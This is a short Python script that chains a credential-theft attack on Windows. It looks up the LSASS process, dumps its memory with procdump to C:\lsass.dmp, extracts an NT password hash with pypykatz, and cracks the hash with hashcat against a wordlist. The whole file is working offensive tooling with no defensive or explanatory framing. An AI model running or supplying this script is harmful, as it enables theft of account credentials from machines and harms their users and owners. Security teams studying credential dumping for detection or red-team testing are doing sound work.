import subprocess
import os

def get_lsass_id():
    """Retrieve the LSASS Process ID."""
    command = "Get-Process lsass | Select-Object -ExpandProperty Id"
    try:
        result = subprocess.run(
            ["powershell", "-Command", command],
            capture_output=True,
            text=True,
            check=True
        )
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"Error retrieving LSASS ID: {e.stderr}")
        return None

def create_dump(process_id, dump_path):
    """Create a memory dump of the LSASS process using procdump."""
    try:
        subprocess.run(
            ["procdump", "-accepteula", "-ma", str(process_id), dump_path],
            check=True
        )
        print(f"Memory dump created at: {dump_path}")
        return dump_path
    except subprocess.CalledProcessError as e:
        print(f"Error creating dump: {e.stderr}")
        return None

def run_pypykatz(dump_path):
    """Run pypykatz on the memory dump to extract NT hash."""
    command = f"pypykatz lsa minidump {dump_path}"
    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        print("pypykatz output:\n", result.stdout)
        # Extract the NT hash (example assumes a specific format in pypykatz output)
        for line in result.stdout.splitlines():
            if "NT:" in line:
                nt_hash = line.split("NT:")[-1].strip()
                return nt_hash
    except subprocess.CalledProcessError as e:
        print(f"Error running pypykatz: {e.stderr}")
    return None

def run_hashcat(nt_hash, wordlist_path):
    """Run hashcat to crack the NT hash."""
    command = f"hashcat -m 1000 {nt_hash} {wordlist_path}"
    try:
        subprocess.run(command, shell=True, check=True)
        print("Hashcat completed successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Error running hashcat: {e.stderr}")

def main():
    dump_path = "C:\\lsass.dmp"

    # Step 1: Get LSASS Process ID
    lsass_id = get_lsass_id()
    if not lsass_id or not lsass_id.isdigit():
        print("Failed to retrieve a valid LSASS Process ID.")
        return

    # Step 2: Create LSASS Dump
    dump_file = create_dump(lsass_id, dump_path)
    if not dump_file:
        return

    # Step 3: Run pypykatz to extract NT hash
    nt_hash = run_pypykatz(dump_file)
    if not nt_hash:
        print("Failed to extract NT hash.")
        return

    print(f"Extracted NT hash: {nt_hash}")

    # Step 4: Prompt for wordlist path and run hashcat
    wordlist_path = input("Enter the full path to the wordlist: ").strip()
    if not os.path.exists(wordlist_path):
        print("Invalid wordlist path. Exiting.")
        return

    run_hashcat(nt_hash, wordlist_path)

if __name__ == "__main__":
    main()
